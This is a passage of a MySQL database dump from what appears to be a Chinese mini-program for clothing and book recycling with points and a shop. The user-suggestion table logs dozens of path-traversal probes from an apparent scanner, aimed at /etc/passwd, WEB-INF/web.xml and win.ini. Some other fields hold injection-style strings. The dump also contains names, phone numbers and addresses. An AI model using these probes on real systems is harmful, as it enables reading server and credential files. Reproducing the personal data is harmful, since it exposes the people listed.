03:34:42'),(177,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','徐鹤翔\";char\"','13465870921','北京市北京市朝阳区和平里西街3号',';北京化工大学昌平新校区',66,1,1,'单片机','2021-10-07 12:11:51'),(178,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','徐鹤翔\";char\"','13465870921','北京市北京市朝阳区和平里西街3号',';北京化工大学昌平新校区',66,1,1,'单片机','2021-10-07 12:15:07');
/*!40000 ALTER TABLE `jifenminus` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jifenplus`
--

DROP TABLE IF EXISTS `jifenplus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `jifenplus` (
  `id` int(100) NOT NULL AUTO_INCREMENT,
  `openid` varchar(30) NOT NULL COMMENT 'openid',
  `techid` varchar(100) NOT NULL COMMENT '设备id',
  `deviceId` varchar(100) NOT NULL COMMENT '设备蓝牙号',
  `kind` int(100) NOT NULL DEFAULT '1' COMMENT '1春夏，2秋冬,3书籍',
  `weight` varchar(60) NOT NULL COMMENT '重量',
  `jifen` int(200) NOT NULL COMMENT '增长积分',
  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=72 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jifenplus`
--

LOCK TABLES `jifenplus` WRITE;
/*!40000 ALTER TABLE `jifenplus` DISABLE KEYS */;
INSERT INTO `jifenplus` VALUES (1,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 10:33:33'),(2,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 10:37:59'),(3,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 10:59:42'),(4,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 11:11:43'),(5,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.103kg',103,'2021-09-26 11:29:12'),(6,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.103kg',103,'2021-09-26 11:34:39'),(7,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.103kg',103,'2021-09-26 11:38:55'),(8,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:13:53'),(9,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:18:03'),(10,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:19:58'),(11,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:20:29'),(12,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:21:56'),(13,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:22:13'),(14,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:23:20'),(15,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:24:25'),(16,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:24:54'),(17,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:25:35'),(18,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:25:46'),(19,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:26:05'),(20,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:26:07'),(21,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:28:06'),(22,'o0fkt45-DHBmncdzIYvNhgxvAjb4','0','00:0C:BF:0D:3A:1B',1,'0.001kg',1,'2021-09-26 13:28:12'),(23,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12$deviceId=1','',3,'2',2000,'2021-10-07 15:58:17'),(24,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:00:59'),(25,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:00:59'),(26,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:01:12'),(27,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:10:27'),(28,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:11:01'),(29,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:11:26'),(30,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:11:48'),(31,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:12:32'),(32,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:12:43'),(33,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:20:45'),(34,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:20:59'),(35,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:25:16'),(36,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:25:47'),(37,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:26:46'),(38,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:27:42'),(39,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:29:53'),(40,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:30:01'),(41,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:32:12'),(42,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:36:10'),(43,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:36:41'),(44,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:39:26'),(45,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:40:41'),(46,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:42:54'),(47,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:43:09'),(48,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:43:10'),(49,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:44:23'),(50,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:46:13'),(51,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:46:50'),(52,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:46:51'),(53,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:46:52'),(54,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:46:53'),(55,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-07 16:48:33'),(56,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-08 00:16:03'),(57,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-08 00:16:05'),(58,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-08 00:16:26'),(59,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-08 00:18:31'),(60,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-08 00:18:35'),(61,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','12','1',3,'2',2000,'2021-10-08 00:18:37'),(62,'null','1','00:0C:BF:0D:3A:1B',1,'0.217kg',217,'2021-10-08 11:00:54'),(63,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'kg',0,'2021-10-08 12:10:26'),(64,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.216kg',216,'2021-10-08 12:18:46'),(65,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.217kg',217,'2021-10-08 12:54:01'),(66,'o0fkt45-DHBmncdzIYvNhgxvAjb4','1','00:0C:BF:0D:3A:1B',1,'0.084kg',84,'2021-10-09 07:10:54'),(67,'null','1','00:0C:BF:0D:3A:1B',1,'0.047kg',47,'2021-10-09 07:12:32'),(68,'o0fkt4_PEr7h6gGkXVMrNDsq3kwg','1','00:0C:BF:0D:3A:1B',1,'0.088kg',88,'2021-10-09 07:13:34'),(69,'o0fkt4_PEr7h6gGkXVMrNDsq3kwg','1','00:0C:BF:0D:3A:1B',1,'0.043kg',43,'2021-10-09 07:15:28'),(71,'o0fkt4_PEr7h6gGkXVMrNDsq3kwg','1','00:0C:BF:0D:3A:1B',1,'0.080kg',80,'2021-10-09 07:19:12');
/*!40000 ALTER TABLE `jifenplus` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kind`
--

DROP TABLE IF EXISTS `kind`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `kind` (
  `kind` int(100) NOT NULL,
  `kindname` varchar(45) NOT NULL,
  `picture` longtext NOT NULL,
  `url` varchar(100) NOT NULL,
  PRIMARY KEY (`kind`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kind`
--

LOCK TABLES `kind` WRITE;
/*!40000 ALTER TABLE `kind` DISABLE KEYS */;
INSERT INTO `kind` VALUES (1,'春夏衣物','https://www.duansheli.club/chunxia.png',''),(2,'秋冬衣物','https://www.duansheli.club/qiudong.png',''),(3,'书籍文本','https://www.duansheli.club/shuji.png','');
/*!40000 ALTER TABLE `kind` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `location`
--

DROP TABLE IF EXISTS `location`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `location` (
  `locid` int(100) NOT NULL AUTO_INCREMENT,
  `openid` varchar(30) NOT NULL COMMENT 'openid',
  `name` varchar(60) NOT NULL COMMENT '收货人',
  `phone` varchar(20) NOT NULL COMMENT '电话',
  `address_detail` varchar(60) DEFAULT NULL COMMENT '详细地址',
  `address` varchar(60) NOT NULL COMMENT '地址',
  `is_default` tinyint(1) DEFAULT '1' COMMENT '默认，1正确',
  `latitude` varchar(100) NOT NULL COMMENT '经度',
  `longitude` varchar(100) NOT NULL COMMENT '纬度',
  `province` varchar(20) NOT NULL COMMENT '省份',
  `city` varchar(20) NOT NULL COMMENT '城市',
  `district` varchar(30) NOT NULL COMMENT '街道',
  PRIMARY KEY (`locid`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `location`
--

LOCK TABLES `location` WRITE;
/*!40000 ALTER TABLE `location` DISABLE KEYS */;
INSERT INTO `location` VALUES (6,'o0fkt42KeHftEXD1tNIeJRwqKa-c','徐鹤翔','17703175244','7#233','北京市北京市昌平区',1,'40.252','116.14691','','',''),(7,'o0fkt47EoHtSjLtyO9TQ9GU3Menc','阿巴阿巴','18582985093','阿巴阿巴','北京市北京市昌平区南口镇南涧路29号',1,'40.25189','116.14723','','',''),(12,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','7@3','北京市东城区东长安街14号',1,'39.90575','116.40473','北京市','北京市','东城区'),(13,'o0fkt4_WXoWWC8uYOcAi8QTpOubA','徐鹤翔\";char\"','13465870921',';北京化工大学昌平新校区','北京市北京市朝阳区和平里西街3号',1,'39.967197','116.41727','北京市','北京市','朝阳区'),(14,'o0fkt47dQPnzznso1-AKMBeKJSKM','刘涛','15513377586','998','北京市北京市昌平区',1,'40.2519','116.14721','北京市','北京市','昌平区');
/*!40000 ALTER TABLE `location` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `lunbo`
--

DROP TABLE IF EXISTS `lunbo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `lunbo` (
  `id` int(100) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `pic` longtext COMMENT '轮播图',
  `nav` varchar(64) DEFAULT 'DEFAULT' COMMENT '指向地址',
  `comm` varchar(64) DEFAULT '' COMMENT '描述',
  `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='轮播图';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `lunbo`
--

LOCK TABLES `lunbo` WRITE;
/*!40000 ALTER TABLE `lunbo` DISABLE KEYS */;
INSERT INTO `lunbo` VALUES (1,'demo','https://www.duansheli.club/images/yifu.png','好','2021-08-11 10:24:19'),(2,'demo2','https://www.duansheli.club/images/bannerdown-1.png','样式','2021-11-28 05:51:53');
/*!40000 ALTER TABLE `lunbo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shoplist`
--

DROP TABLE IF EXISTS `shoplist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `shoplist` (
  `id` int(100) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `category` varchar(64) DEFAULT '' COMMENT '分类Id',
  `shopname` varchar(64) DEFAULT 'DEFAULT' COMMENT '名字',
  `miaoshu` varchar(64) DEFAULT '' COMMENT '描述',
  `picture` varchar(255) DEFAULT '' COMMENT '图片',
  `kucun` varchar(63) DEFAULT '' COMMENT '库存',
  `price` varchar(64) DEFAULT '' COMMENT '价格',
  `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='商品列表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shoplist`
--

LOCK TABLES `shoplist` WRITE;
/*!40000 ALTER TABLE `shoplist` DISABLE KEYS */;
INSERT INTO `shoplist` VALUES (1,'2','单片机','掉头发啊','https://tse2-mm.cn.bing.net/th/id/OIP-C.s0AtNVUuNbbuSnn0xM-4SAHaEo?w=271&h=180&c=7&o=5&dpr=2.15&pid=1.7','6','66','2021-09-14 03:31:06'),(2,'1','卫生纸','刀哥劝你别冲了','https://tse1-mm.cn.bing.net/th/id/R-C.c705ca7dc727bf9ddaa6d9b8a74c1584?rik=%2f6gjX%2f1zJrvbEg&riu=http%3a%2f%2fimg.juimg.com%2ftuku%2fyulantu%2f110219%2f292-110219193A342.jpg&ehk=ICR3eJStaNrcNeZfCW4ZkN160k3j1M1vDwsXiSNjdPA%3d&risl=&pid=ImgRaw&r=0','45','233','2021-09-14 03:30:44');
/*!40000 ALTER TABLE `shoplist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `suggest`
--

DROP TABLE IF EXISTS `suggest`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `suggest` (
  `openid` varchar(64) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL COMMENT 'openid',
  `nickname` varchar(50) DEFAULT '' COMMENT '昵称',
  `avatar` longtext COMMENT '头像',
  `suggest` varchar(1000) DEFAULT NULL COMMENT '建议',
  `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='建议';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `suggest`
--

LOCK TABLES `suggest` WRITE;
/*!40000 ALTER TABLE `suggest` DISABLE KEYS */;
INSERT INTO `suggest` VALUES ('','',NULL,'11',NULL),('2','3','4','5',NULL),('32','',NULL,'123',NULL),('43','',NULL,'22',NULL),('47','',NULL,'78',NULL),('98','',NULL,'7489',NULL),('99','',NULL,'123',NULL),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'123',NULL),('第一个用户','帅哥','fafafa','好啊','2021-08-11 11:42:37'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'ert',NULL),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'11',NULL),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'rte',NULL),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'阿巴阿巴',NULL),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:20:07'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:27:08'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:27:45'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:31:37'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:32:40'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:42:44'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:43:09'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:43:34'),('o0fkt4_WXoWWC8uYOcAi8QTpOubA','',NULL,'0','2021-10-07 12:45:43'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'12131','2021-10-07 12:56:02'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'0','2021-10-07 12:56:27'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','',NULL,'0','2021-10-07 13:04:45'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','',NULL,'199','2021-10-07 13:05:26'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','',NULL,'233','2021-10-07 13:05:50'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','',NULL,'0','2021-10-07 13:06:54'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','',NULL,'我参加','2021-10-07 13:11:51'),('o0fkt47Y4uodZ36rCAWP22ITxYFs','',NULL,'宝贵的已经233','2021-10-07 13:12:15'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,NULL,'2021-10-07 15:14:38'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,NULL,'2021-10-07 15:16:02'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'fasdfdasf','2021-10-07 15:16:43'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'dfa','2021-10-08 01:38:54'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'jlj','2021-10-08 01:43:14'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'fasfa','2021-10-08 01:50:21'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'gs','2021-10-08 01:51:41'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'daa','2021-10-08 01:58:59'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'wqr','2021-10-08 02:03:45'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'daa','2021-10-08 02:13:03'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 02:14:04'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'dfasf','2021-10-08 02:35:26'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'da','2021-10-08 02:36:08'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'daa','2021-10-08 02:36:54'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 02:37:56'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 02:38:48'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'da','2021-10-08 02:44:49'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'131','2021-10-08 06:20:14'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'3','2021-10-08 06:21:04'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'a','2021-10-08 06:22:09'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'fsda','2021-10-08 06:22:36'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 06:24:22'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 06:25:37'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aaa','2021-10-08 06:27:05'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'123','2021-10-08 06:29:23'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'gd','2021-10-08 06:31:02'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 06:31:44'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'a','2021-10-08 06:32:43'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'fa','2021-10-08 06:34:31'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 06:35:08'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'fdaf','2021-10-08 06:37:07'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'fdaf','2021-10-08 06:37:29'),('o0fkt45-DHBmncdzIYvNhgxvAjb4','',NULL,'aa','2021-10-08 06:50:04'),('null','',NULL,'','2021-10-08 06:58:27'),('null','',NULL,'','2021-10-08 12:22:23'),('null','',NULL,'','2021-10-09 03:53:49'),('null','',NULL,'','2021-10-09 12:28:22'),('null','',NULL,'','2021-10-09 12:28:31'),('null','',NULL,'','2021-10-09 12:28:32'),('null','',NULL,'','2021-10-09 12:28:34'),('null','',NULL,'','2021-10-09 12:28:35'),('null','',NULL,'','2021-10-09 12:28:36'),('null','',NULL,'../../WEB-INF/./////.////.///.//./web.xml','2021-10-09 12:28:37'),('null','',NULL,'../../WEB-INF/./////.////.///.//./web.xml','2021-10-09 12:28:37'),('null','',NULL,'../../WEB-INF/./////.////.///.//./web.xml','2021-10-09 12:28:37'),('null','',NULL,'../../WEB-INF/./////.////.///.//./web.xml','2021-10-09 12:28:37'),('null','',NULL,'../../../../../../../../../../../../../../../../../../../../T_S_T/2a13051b2a0ca57ef55e4fe4765ec9d6/etc/passwd','2021-10-09 12:28:38'),('null','',NULL,'/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/./////.////.///.//./win.ini','2021-10-09 12:28:39'),('null','',NULL,'/..\\..\\..\\..\\..\\..\\..\\..\\windows/./////.////.///.//./win.ini','2021-10-09 12:28:39'),('null','',NULL,'/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/./////.////.///.//./win.ini','2021-10-09 12:28:39'),('null','',NULL,'/..\\..\\..\\..\\..\\..\\..\\..\\windows/./////.////.///.//./win.ini','2021-10-09 12:28:39'),('null','',NULL,'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/./////.////.///.//./win.ini','2021-10-09 12:28:41'),('null','',NULL,'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/./////.////.///.//./win.ini','2021-10-09 12:28:41'),('null','',NULL,'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/./////.////.///.//./win.ini','2021-10-09 12:28:42'),('null','',NULL,'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/./////.////.///.//./win.ini','2021-10-09 12:28:42'),('null','',NULL,'file:///etc/./////.////.///.//./passwd','2021-10-09 12:28:43'),('null','',NULL,'file:///etc/./////.////.///.//./passwd','2021-10-09 12:28:44'),('null','',NULL,'file:///etc/./////.////.///.//./passwd','2021-10-09 12:28:44'),('null','',NULL,'file:///etc/./////.////.///.//./passwd','2021-10-09 12:28:44'),('null','',NULL,'invalid../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.','2021-10-09 12:28:46'),('null','',NULL,'invalid../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.','2021-10-09 12:28:46'),('null','',NULL,'invalid../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.','2021-10-09 12:28:46'),('null','',NULL,'invalid../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.','2021-10-09 12:28:47'),('null','',NULL,'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjLy4vLy8vLy4vLy8vLi8vLy4vLy4vcGFzc3dkAA==','2021-10-09 12:28:48'),('null','',NULL,'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjLy4vLy8vLy4vLy8vLi8vLy4vLy4vcGFzc3dkAA==','2021-10-09 12:28:48'),('null','',NULL,'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjLy4vLy8vLy4vLy8vLi8vLy4vLy4vcGFzc3dkAA==','2021-10-09 12:28:49'),('null','',NULL,'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjLy4vLy8vLy4vLy8vLi8vLy4vLy4vcGFzc3dkAA==','2021-10-09 12:28:49'),('null','',NULL,'/etc/./////.////.///.//./passwd','2021-10-09 12:28:51'),('null','',NULL,'/etc/./////.////.///.//./passwd','2021-10-09 12:28:51'),('null','',NULL,'/etc/./////.////.///.//./passwd','2021-10-09 12:28:51'),('null','',NULL,'/etc/./////.////.///.//./passwd','2021-10-09 12:28:51'),('null','',NULL,'/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../../../../../../../../../../../../..//etc/./////.////.///.//./passwd','2021-10-09 12:28:53'),('null','',NULL,'/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../../../../../../../../../../../../..//etc/./////.////.///.//./passwd','2021-10-09 12:28:53'),('null','',NULL,'/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../../../../../../../../../../../../..//etc/./////.////.///.//./passwd','2021-10-09 12:28:54'),('null','',NULL,'/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../../../../../../../../../../../../..//etc/./////.////.///.//./passwd','2021-10-09 12:28:54'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd%00','2021-10-09 12:28:55'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd\0','2021-10-09 12:28:56'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd%00','2021-10-09 12:28:56'),('null','',NULL,'/../../../../../../../../../../../../../../../../../../../../etc/./////.////.///.//./passwd\0','2021-10-09 12:28:56'),('null','',NULL,'/../..//../..//../..//../..//../..//etc/./////.////.///.//./passwd%00.','2021-10-09 